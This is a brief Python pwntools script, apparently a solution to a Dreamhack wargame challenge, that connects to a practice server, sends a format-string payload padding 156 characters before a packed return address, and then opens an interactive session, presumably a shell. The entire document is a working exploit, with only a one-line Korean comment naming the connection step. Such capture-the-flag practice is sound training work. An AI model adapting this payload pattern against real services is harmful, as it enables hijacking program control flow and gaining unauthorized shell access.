from pwn import *

connection = remote('host1.dreamhack.games' , 21101) # 연결하는 명령어

pload = b'%156c' + p32(0x08048669)
connection.sendline(pload)
connection.interactive()